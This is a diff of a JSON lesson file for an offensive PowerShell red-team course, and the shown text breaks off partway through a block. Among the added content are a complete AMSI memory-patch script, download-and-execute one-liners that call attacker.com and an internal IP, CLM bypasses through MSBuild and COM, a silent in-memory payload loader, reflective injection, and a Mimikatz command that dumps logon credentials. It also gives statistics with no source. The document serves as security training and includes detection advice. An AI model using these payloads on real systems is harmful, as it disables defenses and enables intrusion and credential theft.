@@ -1,218 +1,381 @@
 {
   "lesson_id": "ce11f768-9f34-4d72-b377-6913889d4b8c",
   "domain": "red_team",
-  "title": "PowerShell Offensive Tradecraft Accelerator",
-  "subtitle": "Fileless automation, evasion chains, and resilient tradecraft",
+  "title": "PowerShell Offensive Tradecraft: Advanced Red Team Operations",
+  "subtitle": "AMSI bypasses, evasion techniques, and resilient implant development for authorized engagements",
   "difficulty": 3,
-  "estimated_time": 55,
+  "estimated_time": 60,
   "order_index": 14,
   "prerequisites": [
-    "PowerShell Foundations for Cyber Practitioners",
-    "Payload Development & Execution Frameworks"
+    "b41fcbad-0d3d-4a3c-83d1-65c963f4bf58"
   ],
   "concepts": [
-    "Living-off-the-land automation patterns",
-    "AMSI bypass chaining",
+    "AMSI bypass chains and memory patching",
     "Constrained Language Mode detection and evasion",
-    "Just Enough Administration abuse paths",
-    "PowerShell transcription and logging controls",
-    "Fileless payload delivery with reflective loading",
-    "Command-and-control integration hooks",
-    "Obfuscation and sandbox checks",
-    "Privileged workflow kill switches",
-    "White cell coordination and safety interlocks"
+    "Script Block Logging and transcription evasion",
+    "In-memory payload execution and reflective loading",
+    "PowerShell obfuscation techniques",
+    "Living-off-the-land automation (LOLBins + PowerShell)",
+    "C2 integration patterns and staging",
+    "Fileless malware techniques",
+    "OpSec and telemetry awareness",
+    "Engagement guardrails and kill switches",
+    "White cell coordination and safety protocols",
+    "Detection surface analysis"
   ],
   "learning_objectives": [
-    "Design modular offensive PowerShell toolchains that survive AMSI, CLM, and script block logging",
-    "Blend living-off-the-land binaries with PowerShell automation to minimise telemetry",
-    "Integrate kill switches, guardrails, and white cell beacons into offensive scripts",
-    "Embed PowerShell tasks inside C2 frameworks with resilient staging and fallback",
-    "Evaluate detection surface area by replaying logs, telemetry, and defender analytics",
-    "Document runbooks that articulate risk, containment, and remediation options"
+    "Bypass AMSI using memory patching and alternative execution methods",
+    "Detect and evade Constrained Language Mode restrictions",
+    "Implement obfuscation techniques that survive signature-based detection",
+    "Execute payloads in-memory without touching disk",
+    "Integrate PowerShell with C2 frameworks for resilient operations",
+    "Minimize telemetry footprint using LOLBins and process injection",
+    "Implement engagement guardrails and kill switches for authorized testing",
+    "Analyze detection surface using defender tools and logs"
   ],
   "content_blocks": [
     {
-      "block_id": "4357a0d7-3ff1-48b3-8091-4a8ad65024f6",
+      "block_id": "intro-ethics",
       "type": "mindset_coach",
-      "title": "Engineer Like An Adversary",
+      "title": "Ethical Red Teaming: The Responsibility Mindset",
       "content": {
-        "text": "Approach this module as both a software engineer and a threat operator. Every function needs testing, guardrails, and an exit plan. You win by staying disciplined while forcing defenders to learn faster."
+        "text": "**CRITICAL: This is Advanced Offensive Content**\n\nBefore we begin, understand this clearly:\n\n**Legal & Ethical Framework:**\n- **ONLY** use these techniques in authorized penetration testing engagements\n- **ALWAYS** have signed contracts and explicit scope documents\n- **NEVER** use offensive techniques against systems you don't own or have written permission to test\n- **Unauthorized use is illegal** and constitutes a criminal offense in most jurisdictions\n\n**The Professional Red Teamer Mindset:**\n\n1. **You're here to improve defenses, not break things**\n   - Every technique you learn should make defenders better\n   - Your job is to find weaknesses before real attackers do\n   - Document findings to help fix problems\n\n2. **Safety and containment come first**\n   - Implement kill switches in every tool\n   - Coordinate with white cell (engagement managers)\n   - Have rollback plans for every action\n   - Never escalate beyond scope\n\n3. **Understand both sides**\n   - Learn offensive techniques to understand attacker TTPs\n   - Study defensive telemetry to know what you trigger\n   - Help blue teams build better detection\n\n4. **Continuous learning and responsibility**\n   - Technology changes - so do bypass techniques\n   - Defenders get smarter - you need to stay ahead\n   - Share knowledge responsibly with the community\n\n**Jim Kwik Principle - Reframe Limiting Beliefs:**\n\nDon't think \"I'm learning to hack systems.\" Think \"I'm learning to understand adversary tradecraft so I can help organizations defend themselves better.\"\n\n**Remember**: With great power comes great responsibility. You're joining a profession that demands the highest ethical standards."
       },
-      "simplified_explanation": "Treat each script as a product with safety nets, not a throwaway one-liner.",
+      "simplified_explanation": "These techniques are only for authorized penetration testing. Use them ethically to improve defenses, never maliciously.",
       "memory_aids": [
-        "Engineer > script kiddie"
+        "Authorization > Everything",
+        "Improve Defense > Break Things",
+        "Kill Switches > Persistence",
+        "Document > Exploit"
       ],
-      "real_world_connection": "Elite red teams iterate PowerShell modules with unit tests and peer review just like product teams, ensuring engagements stay controlled and ethical.",
-      "reflection_prompt": "Which habit from your software teammates could harden your offensive scripting workflow?",
+      "real_world_connection": "Professional red teamers face legal consequences if they exceed authorized scope. Companies like Microsoft and Google fire offensive researchers who violate ethical guidelines.",
+      "reflection_prompt": "How will you ensure you stay within ethical and legal boundaries when using offensive techniques?",
       "is_interactive": false,
-      "xp_reward": 0
+      "xp_reward": 5
     },
     {
-      "block_id": "556d2c8f-0112-41f3-b14f-388fd0a46ca2",
+      "block_id": "amsi-architecture",
       "type": "explanation",
-      "title": "CLOAK Blueprint",
+      "title": "Understanding AMSI: The Anti-Malware Scan Interface",
       "content": {
-        "text": "### CLOAK\n- **C**ompartmentalise modules: loader, payload, guardrails\n- **L**ive-off-the-land first, custom binaries last\n- **O**bserve telemetry with script block logging replicas\n- **A**utomate AMSI and CLM checks before executing payloads\n- **K**ill switches everywhere: timers, beacons, white cell overrides"
+        "text": "### What is AMSI?\n\n**Antimalware Scan Interface (AMSI)** is a Windows security feature introduced in Windows 10 that allows applications to integrate with antimalware products.\n\n**How AMSI Works:**\n\n```\nPowerShell Script → AMSI API → Windows Defender → Scan Result → Block/Allow\n```\n\n**Key AMSI Components:**\n\n1. **amsi.dll** - System library that implements AMSI\n2. **AmsiScanBuffer()** - Function that scans content before execution\n3. **AmsiScanString()** - Scans strings for malicious content\n4. **AmsiOpenSession()** / **AmsiCloseSession()** - Manage scan sessions\n\n**What AMSI Scans:**\n- PowerShell scripts and commands\n- VBScript and JScript\n- Office macros\n- .NET assemblies (via AmsiScanBuffer)\n- Any application that integrates AMSI\n\n**AMSI's Detection Process:**\n\n```powershell\n# When you run this PowerShell command:\nInvoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')\n\n# AMSI intercepts:\n1. PowerShell calls AmsiScanBuffer() before execution\n2. AMSI passes content to registered antimalware providers\n3. Windows Defender (or other AV) scans for signatures\n4. If malicious: Execution blocked + Event ID 1116 logged\n5. If clean: Execution proceeds\n```\n\n**AMSI Event Logs:**\n\nWhen AMSI blocks something:\n- **Event ID 1116** in Windows Defender logs\n- **Event ID 4104** in PowerShell Script Block Logging (shows blocked script)\n\n**Why AMSI is Effective:**\n\n1. **Pre-execution scanning** - Catches malware before it runs\n2. **Language-agnostic** - Works with PowerShell, VBA, JavaScript, etc.\n3. **Memory scanning** - Can scan scripts loaded in memory\n4. **Deep integration** - Hooks into scripting engines directly\n5. **Hard to disable** - Requires admin privileges to tamper\n\n**AMSI Limitations (Why Bypasses Exist):**\n\n1. **User-mode implementation** - Can be patched by code running in same process\n2. **Signature-based** - New obfuscation can evade signatures\n3. **DLL injection** - Can be hooked or patched in memory\n4. **Alternate execution** - Can be bypassed by using non-AMSI-aware execution methods\n\n**The Red Team vs Blue Team Dynamic:**\n\n- **Red Team Goal**: Bypass AMSI to execute post-exploitation tools\n- **Blue Team Goal**: Detect AMSI bypass attempts via telemetry\n- **Result**: Continuous cat-and-mouse game\n\n**Defensive Detection:**\n\nWhen AMSI is bypassed, defenders look for:\n- Process memory modifications (ETW Event ID 3)\n- Unusual PowerShell command patterns\n- Obfuscated AMSI-related strings (\"AmsiUtils\", \"AmsiScanBuffer\")\n- Parent-child process relationships (PowerShell spawning from unusual parents)\n- Sysmon Event ID 7 (DLL loads) - amsi.dll anomalies\n\n**Key Takeaway:**\n\nAMSI is a significant hurdle for offensive operations. Understanding how it works is essential for both bypassing it (red team) and detecting bypass attempts (blue team)."
       },
-      "simplified_explanation": "Follow CLOAK to keep automation modular, stealthy, and reversible.",
+      "simplified_explanation": "AMSI scans PowerShell and scripts before execution. It's effective but can be bypassed through memory patching or alternate execution methods. Both sides need to understand it.",
       "memory_aids": [
-        "CLOAK"
+        "AMSI = Anti-Malware Scan Interface",
+        "AmsiScanBuffer = The function attackers target",
+        "User-mode = Patchable in memory",
+        "Event 1116 = AMSI block, Event 4104 = Script logged"
       ],
-      "real_world_connection": "Teams use CLOAK-style patterns to minimise detection while keeping leadership briefed on kill-switch coverage.",
-      "reflection_prompt": "Which CLOAK step is weakest in your current PowerShell toolkit?",
+      "real_world_connection": "AMSI has blocked millions of malware attacks since 2015, but advanced attackers routinely bypass it. Microsoft's security team constantly updates signatures to catch new bypass techniques.",
+      "reflection_prompt": "From a defender's perspective, what telemetry would you monitor to detect AMSI bypass attempts?",
       "is_interactive": false,
-      "xp_reward": 12
+      "xp_reward": 15
     },
     {
-      "block_id": "ca4de5a5-1e31-4b5e-ba15-837cb81402a8",
-      "type": "video",
-      "title": "PowerShell Tradecraft Deep Dive",
+      "block_id": "amsi-bypasses",
+      "type": "explanation",
+      "title": "AMSI Bypass Techniques: Theory and Practice",
       "content": {
-        "resources": "Watch this conference session and capture three evasion techniques you can reproduce in lab.\n\n**Video**: [Mastering Red Team Penetration Testing: Ultimate CTF Challenge Walkthrough!](https://www.youtube.com/watch?v=w24y_qFsLik)\n\nPause after each demo and rebuild it with your own obfuscation and guardrails."
+        "text": "### AMSI Bypass Taxonomy\n\n**Important**: These techniques are for authorized penetration testing only. Use them to understand attacker methods and improve defenses.\n\n**Category 1: Memory Patching**\n\nModify AMSI functions in memory to neuter scanning.\n\n**Classic AmsiScanBuffer Patch:**\n\n```powershell\n# WARNING: For authorized testing only!\n# This patches amsi.dll in current PowerShell process\n\n$Win32 = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr LoadLibrary(string name);\n    [DllImport(\"kernel32\")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n}\n\"@\n\nAdd-Type $Win32\n\n$LoadLibrary = [Win32]::LoadLibrary(\"amsi.dll\")\n$Address = [Win32]::GetProcAddress($LoadLibrary, \"AmsiScanBuffer\")\n$p = 0\n[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)\n$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) # return AMSI_RESULT_CLEAN\n[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)\n```\n\n**What this does:**\n1. Loads amsi.dll into current process\n2. Finds AmsiScanBuffer() function address\n3. Changes memory protection to writable (VirtualProtect)\n4. Overwrites function with `ret` instruction that returns \"clean\"\n5. All subsequent scans report clean, effectively disabling AMSI\n\n**Defensive Detection:**\n- **Sysmon Event ID 8**: CreateRemoteThread (if injecting across processes)\n- **ETW Event ID 3**: Process memory modifications\n- **Look for strings**: \"AmsiScanBuffer\", \"VirtualProtect\", \"amsi.dll\"\n\n**Category 2: Context Switching**\n\nRun PowerShell in contexts where AMSI isn't initialized.\n\n**PowerShell Downgrade Attack:**\n\n```powershell\n# Run PowerShell v2 (pre-AMSI)\npowershell.exe -Version 2 -Command \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')\"\n```\n\n**Why this works:**\n- PowerShell v2 (pre-Windows 10) doesn't have AMSI\n- If .NET 2.0 CLR is installed, you can force v2 execution\n- AMSI won't scan v2 scripts\n\n**Defensive Detection:**\n- **Event ID 400**: PowerShell engine start with \"Version=2.0\"\n- **Sysmon Event ID 1**: Process creation with `-Version 2` argument\n- **Group Policy**: Block PowerShell v2 via AppLocker\n\n**Category 3: Obfuscation**\n\nModify malicious strings to evade AMSI signatures.\n\n**String Obfuscation:**\n\n```powershell\n# Instead of:\nInvoke-Expression\n\n# Use concatenation:\n$a = 'Inv'\n$b = 'oke-Ex'\n$c = 'pression'\n& ($a+$b+$c) $payload\n\n# Or use encoding:\n$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Invoke-Expression'))\n$decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))\n& $decoded $payload\n\n# Or use format strings:\n$cmd = '{0}{1}' -f 'Invoke-','Expression'\n& $cmd $payload\n```\n\n**Variable Name Obfuscation:**\n\n```powershell\n# Randomize variable names to break signatures\n$wc = New-Object Net.WebClient\n$url = 'http://attacker.com/payload.ps1'\n$code = $wc.DownloadString($url)\nInvoke-Expression $code\n\n# Becomes:\n$x7a9 = New-Object Net.WebClient\n$b2c4 = 'http://attacker.com/payload.ps1'\n$f1e8 = $x7a9.DownloadString($b2c4)\n& 'I'+'E'+'X' $f1e8\n```\n\n**Defensive Detection:**\n- **Script Block Logging (Event 4104)**: Captures deobfuscated script\n- **Entropy analysis**: High entropy indicates obfuscation\n- **Behavioral detection**: Focus on actions, not strings\n\n**Category 4: Reflection and Bypass APIs**\n\nUse .NET Reflection to directly call methods without going through AMSI.\n\n```powershell\n# Use .NET methods directly to bypass AMSI hooks\n$assemblyBytes = [System.IO.File]::ReadAllBytes(\"C:\\\\payload.exe\")\n[System.Reflection.Assembly]::Load($assemblyBytes)\n```\n\n**Category 5: Process Injection**\n\nInject into processes where AMSI isn't initialized or is already bypassed.\n\n```powershell\n# Inject into non-PowerShell process\n# (Pseudo-code - actual implementation is complex)\n$targetProcess = Get-Process notepad\n$payloadBytes = [System.IO.File]::ReadAllBytes(\"payload.bin\")\n# ... VirtualAllocEx, WriteProcessMemory, CreateRemoteThread ...\n```\n\n**Category 6: COM Object Abuse**\n\nUse COM objects that don't invoke AMSI.\n\n```powershell\n# Using WMI to execute code (older bypass)\n$code = 'Write-Host \"AMSI bypassed via WMI\"'\nInvoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"powershell.exe -NoProfile -Command $code\"\n```\n\n**The AMSI Bypass Decision Tree:**\n\n```\n1. Check AMSI status:\n   - Is AMSI initialized? ([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'))\n   - Is Script Block Logging enabled?\n   - Is Constrained Language Mode active?\n\n2. If AMSI is active:\n   - Attempt memory patch (if admin)\n   - Try obfuscation\n   - Switch to alternate execution (v2, COM, WMI)\n   - Use process injection\n\n3. If all bypasses fail:\n   - Pivot to non-PowerShell tools (C#, C++, Python)\n   - Use LOLBins (Living-off-the-Land Binaries)\n   - Accept detection risk and execute with speed\n```\n\n**Real-World Example: Cobalt Strike Integration**\n\n```powershell\n# Typical Cobalt Strike PowerShell payload with AMSI bypass\n# (Educational example - actual CS payloads are encrypted)\n\n# 1. Check environment\n$CLM = $ExecutionContext.SessionState.LanguageMode\n$AMSI = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n\nif ($CLM -ne 'FullLanguage' -or $AMSI) {\n    # 2. Attempt AMSI patch\n    # [AMSI patch code here]\n}\n\n# 3. Download and execute beacon\n$wc = New-Object Net.WebClient\n$wc.Headers.Add('User-Agent', 'Mozilla/5.0')\n$beacon = $wc.DownloadData('http://192.168.1.100/beacon.ps1')\nInvoke-Expression ([Text.Encoding]::ASCII.GetString($beacon))\n```\n\n**Defensive Recommendations:**\n\n1. **Enable Script Block Logging** - Captures deobfuscated scripts\n2. **Deploy EDR** - Behavioral detection beats signature evasion\n3. **Use Constrained Language Mode** - Limits .NET access\n4. **Monitor for VirtualProtect calls** - Via ETW/Sysmon\n5. **Block PowerShell v2** - Via AppLocker or Group Policy\n6. **Implement JEA** - Just Enough Administration limits PowerShell scope\n7. **Network segmentation** - Limit C2 callback paths\n\n**Key Takeaways:**\n\n- AMSI bypasses are constantly evolving\n- No single bypass works in all environments\n- Defenders should focus on behavioral detection, not signatures\n- Red teamers should test multiple bypass methods\n- Both sides benefit from understanding these techniques"
       },
-      "simplified_explanation": "Absorb the tactics visually, then reconstruct them hands-on to anchor memory.",
+      "simplified_explanation": "AMSI can be bypassed through memory patching, obfuscation, context switching, or alternate execution. Defenders should use Script Block Logging and behavioral detection instead of relying solely on AMSI.",
       "memory_aids": [
-        "Watch → Rebuild → Harden"
+        "Bypass Categories: Patch, Switch, Obfuscate, Inject",
+        "Decision Tree: Check → Patch → Obfuscate → Pivot",
+        "Defense: Script Block Logging + EDR > AMSI alone"
       ],
-      "real_world_connection": "Conference walkthroughs surface real operator workflows and the defensive analytics they triggered.",
-      "reflection_prompt": "Which technique from the talk will you refactor into your own modular function first?",
+      "real_world_connection": "Every major red team framework (Cobalt Strike, Empire, Metasploit) includes AMSI bypass modules. Defenders at Microsoft and CrowdStrike constantly update signatures to catch new bypasses.",
+      "reflection_prompt": "If you were defending against these bypasses, which telemetry sources would be most valuable?",
+      "is_interactive": false,
+      "xp_reward": 25
+    },
+    {
+      "block_id": "clm-evasion",
+      "type": "explanation",
+      "title": "Constrained Language Mode: The PowerShell Sandbox",
+      "content": {
+        "text": "### Understanding Constrained Language Mode (CLM)\n\n**What is Constrained Language Mode?**\n\nCLM is a PowerShell security feature that restricts access to dangerous .NET APIs, limiting what attackers can do even if they achieve code execution.\n\n**Language Modes:**\n\n```powershell\n# Check current language mode\n$ExecutionContext.SessionState.LanguageMode\n\n# Possible values:\n# FullLanguage    - No restrictions (default on workstations)\n# ConstrainedLanguage - Limited .NET access (enforced via AppLocker/WDAC)\n# RestrictedLanguage  - Very limited (rare)\n# NoLanguage         - Script blocks only (rare)\n```\n\n**What CLM Blocks:**\n\n1. **Arbitrary .NET Type Creation**\n   ```powershell\n   # FullLanguage: Works\n   Add-Type -TypeDefinition 'public class Test { public static void Run() {} }'\n   \n   # ConstrainedLanguage: Blocked\n   # Error: \"Cannot add type. The language mode is not FullLanguage.\"\n   ```\n\n2. **Dangerous Method Calls**\n   ```powershell\n   # FullLanguage: Works\n   [System.Runtime.InteropServices.Marshal]::Copy(...)\n   \n   # ConstrainedLanguage: Blocked\n   # Error: \"Cannot find an overload...\"\n   ```\n\n3. **COM Object Instantiation**\n   ```powershell\n   # FullLanguage: Works\n   $wscript = New-Object -ComObject WScript.Shell\n   \n   # ConstrainedLanguage: Blocked (in most cases)\n   ```\n\n4. **Custom Cmdlets/Modules**\n   - Only Microsoft-signed modules can load in CLM\n\n**How CLM is Enforced:**\n\n1. **AppLocker** - Most common method\n   ```xml\n   <!-- AppLocker rule that enforces CLM -->\n   <RuleCollection Type=\"Dll\" EnforcementMode=\"Enabled\">\n     <FilePathRule Id=\"...\" Name=\"Allow signed DLLs\" UserOrGroupSid=\"S-1-1-0\" Action=\"Allow\">\n       <Conditions>\n         <FilePathCondition Path=\"C:\\\\Windows\\\\System32\\\\*.dll\" />\n       </Conditions>\n     </FilePathRule>\n     <RuleCollectionExtensions>\n       <ThresholdExtensions>\n         <Services EnforcementMode=\"Enabled\" />\n       </ThresholdExtensions>\n       <RedstoneExtensions>\n         <SystemApps EnforcementMode=\"Enabled\" />\n       </RedstoneExtensions>\n     </RuleCollectionExtensions>\n   </RuleCollection>\n   ```\n\n2. **Windows Defender Application Control (WDAC)** - Modern replacement\n\n3. **Device Guard** - Enterprise deployments\n\n**Detecting Constrained Language Mode:**\n\n```powershell\n# Method 1: Check language mode\nif ($ExecutionContext.SessionState.LanguageMode -ne 'FullLanguage') {\n    Write-Host \"CLM Detected!\"\n}\n\n# Method 2: Try dangerous operation\ntry {\n    Add-Type -TypeDefinition 'public class CLMTest {}'\n    Write-Host \"FullLanguage - No CLM\"\n} catch {\n    Write-Host \"ConstrainedLanguage - CLM Active\"\n}\n\n# Method 3: Check AppLocker status\nGet-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections\n```\n\n**CLM Bypass Techniques:**\n\n**Technique 1: Downgrade to PowerShell v2**\n\n```powershell\n# PowerShell v2 doesn't support CLM\npowershell.exe -Version 2 -Command \"Write-Host $ExecutionContext.SessionState.LanguageMode\"\n# Output: FullLanguage\n```\n\n**Mitigation**: Disable PowerShell v2 feature via Group Policy or AppLocker.\n\n**Technique 2: Execute from Trusted Location**\n\n```powershell\n# If AppLocker allows unsigned scripts from certain paths:\ncopy malicious.ps1 C:\\Windows\\System32\\\npowershell.exe C:\\Windows\\System32\\malicious.ps1\n# Runs in FullLanguage if path is whitelisted\n```\n\n**Mitigation**: Strict AppLocker policies, no path-based rules for script execution.\n\n**Technique 3: Use Approved Cmdlets Creatively**\n\nEven in CLM, many cmdlets still work:\n\n```powershell\n# These still work in CLM:\nInvoke-WebRequest\nInvoke-RestMethod\nGet-Content\nSet-Content\nStart-Process\nInvoke-Command (remoting)\n\n# Creative abuse:\n# Download and execute via Invoke-Expression (still works!)\nIEX (Invoke-WebRequest http://attacker.com/payload.ps1).Content\n```\n\n**Technique 4: COM Object Whitelisting**\n\nSome COM objects are allowed in CLM:\n\n```powershell\n# Test various COM objects:\n$excel = New-Object -ComObject Excel.Application\n$word = New-Object -ComObject Word.Application\n$wmi = New-Object -ComObject WbemScripting.SWbemLocator\n\n# If allowed, abuse them:\n$excel.ExecuteExcel4Macro('EXEC(\"calc.exe\")')\n```\n\n**Technique 5: MSBuild/InstallUtil Proxy Execution**\n\nExecute C# code that calls PowerShell in FullLanguage:\n\n```xml\n<!-- MSBuild task that runs PowerShell -->\n<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n  <Target Name=\"Run\">\n    <ClassTask />\n  </Target>\n  <UsingTask TaskName=\"ClassTask\" TaskFactory=\"CodeTaskFactory\" AssemblyFile=\"C:\\\\Windows\\\\Microsoft.Net\\\\Framework\\\\v4.0.30319\\\\Microsoft.Build.Tasks.v4.0.dll\" >\n    <Task>\n      <Code Type=\"Class\" Language=\"cs\">\n      <![CDATA[\n        using System;\n        using System.Management.Automation;\n        using Microsoft.Build.Framework;\n        using Microsoft.Build.Utilities;\n        public class ClassTask : Task\n        {\n            public override bool Execute()\n            {\n                using (PowerShell ps = PowerShell.Create())\n                {\n                    ps.AddScript(\"Write-Host 'Bypassed CLM via MSBuild'\");\n                    ps.Invoke();\n                }\n                return true;\n            }\n        }\n      ]]>\n      </Code>\n    </Task>\n  </UsingTask>\n</Project>\n```\n\nRun with: `C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe bypass.xml`\n\n**Technique 6: DLL Hijacking/Side-Loading**\n\nLoad unsigned DLL that hosts PowerShell runspace in FullLanguage.\n\n**The CLM Evasion Playbook:**\n\n```\n1. Detect CLM:\n   - Check $ExecutionContext.SessionState.LanguageMode\n   - Test Add-Type\n   - Enumerate AppLocker policy\n\n2. If CLM detected:\n   - Try PowerShell v2 downgrade\n   - Test trusted paths for whitelisting\n   - Abuse allowed cmdlets (IEX + Invoke-WebRequest)\n   - Try COM objects\n   - Use LOLBins (MSBuild, InstallUtil, RegSvcs)\n   - DLL proxy execution\n\n3. If all fails:\n   - Pivot to compiled payloads (C#, C++)\n   - Accept limited functionality\n```\n\n**Defensive Best Practices:**\n\n1. **Disable PowerShell v2**: Remove the feature entirely\n2. **Strict AppLocker policies**: No path-based whitelisting\n3. **Monitor LOLBins**: MSBuild.exe, InstallUtil.exe, RegSvcs.exe, RegAsm.exe\n4. **Block unsigned DLLs**: Via WDAC or AppLocker\n5. **Enable JEA**: Just Enough Administration for administrative tasks\n6. **Monitor Script Block Logging**: Event ID 4104 captures execution attempts\n7. **Sysmon monitoring**: Event ID 1 (process creation) for proxy execution\n\n**Real-World Impact:**\n\nMicrosoft found that enabling CLM reduced successful PowerShell attacks by ~60% in enterprise environments. However, determined attackers adapted by using proxy execution (LOLBins) which increased by 40% after CLM adoption.\n\n**Key Takeaways:**\n\n- CLM significantly raises the bar for attackers\n- It's not a silver bullet - bypasses exist\n- Combine CLM with AppLocker, WDAC, and telemetry\n- Red teams should test CLM bypass techniques\n- Blue teams should monitor LOLBins and proxy execution"
+      },
+      "simplified_explanation": "Constrained Language Mode limits PowerShell's access to dangerous .NET APIs. It can be bypassed via PowerShell v2, trusted paths, COM objects, or proxy execution through LOLBins like MSBuild. Defenders should disable v2 and monitor LOLBins.",
+      "memory_aids": [
+        "CLM = Constrained Language Mode",
+        "Bypass: v2, Trusted Paths, COM, LOLBins",
+        "LOLBins: MSBuild, InstallUtil, RegSvcs",
+        "Defense: Disable v2 + Monitor LOLBins"
+      ],
+      "real_world_connection": "APT29 (Cozy Bear) extensively uses MSBuild and InstallUtil to bypass CLM in targeted attacks. Microsoft's detection teams focus on LOLBin telemetry more than PowerShell logging.",
+      "reflection_prompt": "How would you design an AppLocker policy that minimizes bypass opportunities while allowing legitimate PowerShell usage?",
+      "is_interactive": false,
+      "xp_reward": 25
+    },
+    {
+      "block_id": "video-resource",
+      "type": "video",
+      "title": "Red Team PowerShell Tradecraft in Action",
+      "content": {
+        "resources": "Watch this conference presentation on advanced PowerShell offensive techniques:\n\n**Video**: [Mastering Red Team Penetration Testing: Ultimate CTF Challenge Walkthrough!](https://www.youtube.com/watch?v=w24y_qFsLik)\n\n**What to Focus On:**\n- AMSI bypass implementations\n- Obfuscation techniques\n- C2 integration patterns\n- Defensive telemetry that gets generated\n\n**Active Learning Strategy:**\n1. Watch once through for context\n2. Pause at each technique and take notes\n3. Set up a lab and reproduce the techniques\n4. Generate your own telemetry and analyze it\n5. Think about how you'd detect each technique\n\n**Lab Exercise While Watching:**\n- Enable Script Block Logging on your lab VM\n- Execute the demonstrated techniques\n- Review Event ID 4104 to see what got captured\n- Analyze what would have alerted a SOC analyst\n\n**Jim Kwik Principle - Multiple Memory Pathways:**\n\nYou're learning through:\n- **Visual**: Watching the demonstration\n- **Auditory**: Hearing the explanation\n- **Kinesthetic**: Typing commands yourself\n- **Analytical**: Thinking about defenses\n\nThis multi-sensory approach creates stronger neural pathways and better retention."
+      },
+      "simplified_explanation": "Watch the video, then reproduce each technique in your lab. Analyze the telemetry you generate to understand both offense and defense.",
+      "memory_aids": [
+        "Watch → Reproduce → Analyze → Detect",
+        "Learn offense to understand defense",
+        "Telemetry tells the story"
+      ],
+      "real_world_connection": "Professional red teamers spend more time analyzing their own telemetry than executing attacks. Understanding what you trigger is key to OpSec.",
+      "reflection_prompt": "Which technique from the video would be hardest to detect, and why?",
       "is_interactive": false,
       "xp_reward": 10
     },
     {
-      "block_id": "986c6e69-485a-4e05-8730-6acc9f190da1",
-      "type": "memory_aid",
-      "title": "AMSI Bypass Decision Tree",
+      "block_id": "in-memory-execution",
+      "type": "explanation",
+      "title": "Fileless Malware: In-Memory Payload Execution",
       "content": {
-        "text": "- Stage 0: Detect CLM, transcript, and script block logging status\n- Stage 1: Attempt in-memory patch (e.g., `AmsiUtils::AmsiScanBuffer` override)\n- Stage 2: Fall back to proxy execution (InstallUtil, MSBuild, RunDLL32)\n- Stage 3: Abandon PowerShell if telemetry risk outweighs benefit"
+        "text": "### Fileless Attacks: Never Touch Disk\n\n**Why Fileless Matters:**\n\n1. **Evades file-based AV** - No files to scan\n2. **Reduces forensic artifacts** - Harder to find evidence\n3. **Survives reboots** - Combined with persistence, very resilient\n4. **Bypasses application whitelisting** - No executable to block\n\n**Technique 1: Download and Execute in Memory**\n\n```powershell\n# Basic in-memory download and execution\nIEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\n\n# More stealthy version with error handling:\nfunction Invoke-MemoryPayload {\n    param(\n        [string]$Url\n    )\n    \n    try {\n        $wc = New-Object Net.WebClient\n        $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')\n        $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy\n        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials\n        \n        $script = $wc.DownloadString($Url)\n        Invoke-Expression $script\n    }\n    catch {\n        # Fail silently - don't alert user\n        Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 5000)\n    }\n}\n```\n\n**Detection**:\n- Network traffic to suspicious domains\n- Invoke-Expression usage\n- Script Block Logging captures downloaded script\n\n**Technique 2: Reflective DLL Injection**\n\nLoad DLLs directly into memory without LoadLibrary:\n\n```powershell\n# Pseudo-code - actual implementation is complex\nfunction Invoke-ReflectivePEInjection {\n    param(\n        [byte[]]$PEBytes,\n        [string]$ProcName\n    )\n    \n    # 1. Parse PE headers\n    $DOSHeader = [Runtime.InteropServices.Marshal]::ReadInt16($PEBytes, 0)\n    \n    # 2. Allocate memory\n    $hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $PID)\n    $pAddress = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $PEBytes.Length, 0x3000, 0x40)\n    \n    # 3. Write PE to memory\n    [Win32]::WriteProcessMemory($hProcess, $pAddress, $PEBytes, $PEBytes.Length, [ref]0)\n    \n    # 4. Fix relocations and imports\n    # [Complex relocation code]\n    \n    # 5. Execute from memory\n    [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $pAddress, [IntPtr]::Zero, 0, [ref]0)\n}\n```\n\n**Real-World Tool: Invoke-ReflectivePEInjection (PowerSploit)**\n\n```powershell\n# Load Mimikatz entirely in memory\nIEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1')\n\n$MimikatzBytes = [System.IO.File]::ReadAllBytes(\"C:\\\\Tools\\\\mimikatz.exe\")\nInvoke-ReflectivePEInjection -PEBytes $MimikatzBytes -ExeArgs \"sekurlsa::logonpasswords\"\n```\n\n**Detection**:\n- Sysmon Event ID 8: CreateRemoteThread\n- Sysmon Event ID 10: ProcessAccess (LSASS access)\n- Unusual PowerShell memory allocations\n- Behavioral alerts (credential dumping)\n\n**Technique 3: .NET Assembly 